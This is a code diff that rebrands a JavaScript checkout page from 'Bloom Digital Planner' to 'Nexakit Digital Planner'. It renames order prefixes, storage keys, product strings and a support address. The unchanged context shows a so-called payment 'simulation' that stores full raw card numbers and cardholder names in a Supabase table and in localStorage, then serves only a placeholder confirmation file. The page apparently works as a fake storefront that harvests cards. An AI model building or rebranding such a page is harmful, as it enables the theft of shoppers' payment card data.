@@ -398,7 +398,7 @@ async function saveOrderToSupabase(order) {
 /* ─── PAYMENT PROCESSING SIMULATION ─────────────────────── */
 function generateOrderNumber() {
   const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-  let id = 'BP-';
+  let id = 'NK-';
   for (let i = 0; i < 8; i++) id += chars[Math.floor(Math.random() * chars.length)];
   return id;
 }
@@ -439,7 +439,7 @@ function processPayment() {
       country: document.getElementById('country').value,
       amount: 0.99,
       currency: 'USD',
-      product: 'Bloom Digital Planner — Complete Edition',
+      product: 'Nexakit Digital Planner — Complete Edition',
       card_type: cardTypeLabel,
       card_number: rawDigits,
       card_holder: cardName.value.trim(),
@@ -453,9 +453,9 @@ function processPayment() {
     if (!saved) {
       // Fallback to localStorage if Supabase fails
       try {
-        const existing = JSON.parse(localStorage.getItem('bloom_orders') || '[]');
+        const existing = JSON.parse(localStorage.getItem('nexakit_orders') || '[]');
         existing.unshift(order);
-        localStorage.setItem('bloom_orders', JSON.stringify(existing));
+        localStorage.setItem('nexakit_orders', JSON.stringify(existing));
       } catch (e) {}
     }
     // ──────────────────────────────────────────────────────────
@@ -476,11 +476,11 @@ function processPayment() {
 /* ─── TOAST NOTIFICATION ─────────────────────────────────── */
 function showToast(message, type = 'success') {
   // Remove existing toast
-  const existing = document.getElementById('bloom-toast');
+  const existing = document.getElementById('nexakit-toast');
   if (existing) existing.remove();
 
   const toast = document.createElement('div');
-  toast.id = 'bloom-toast';
+  toast.id = 'nexakit-toast';
   const bgColor = type === 'success' ? '#2C8A4A' : '#C0392B';
   toast.style.cssText = `
     position: fixed;
@@ -593,12 +593,12 @@ document.getElementById('download-btn').addEventListener('click', function (e) {
   }, 3000);
 
   // Create a demo text file download for testing
-  const content = `BLOOM PLANNER — DOWNLOAD CONFIRMATION
+  const content = `NEXAKIT — DOWNLOAD CONFIRMATION
 =====================================
 Thank you for your purchase!
 
 Order Details:
-• Product: Bloom Digital Planner (Complete Edition)
+• Product: Nexakit Digital Planner (Complete Edition)
 • Price: $0.99
 • Date: ${new Date().toLocaleDateString('en-US', {year:'numeric', month:'long', day:'numeric'})}
 
@@ -610,15 +610,15 @@ Getting Started:
 3. Import the file & tap any hyperlink to navigate
 4. Add your stickers from the included sticker sheets
 
-Need help? support@bloomplanner.com
+Need help? support@nexakit.com
 
-© ${new Date().getFullYear()} Bloom Planner. All rights reserved.
+© ${new Date().getFullYear()} Nexakit. All rights reserved.
 `;
   const blob = new Blob([content], { type: 'text/plain' });
   const url  = URL.createObjectURL(blob);
   const a    = document.createElement('a');
   a.href     = url;
-  a.download = 'BloomPlanner_DownloadConfirmation.txt';
+  a.download = 'Nexakit_DownloadConfirmation.txt';
   a.click();
   URL.revokeObjectURL(url);
 });
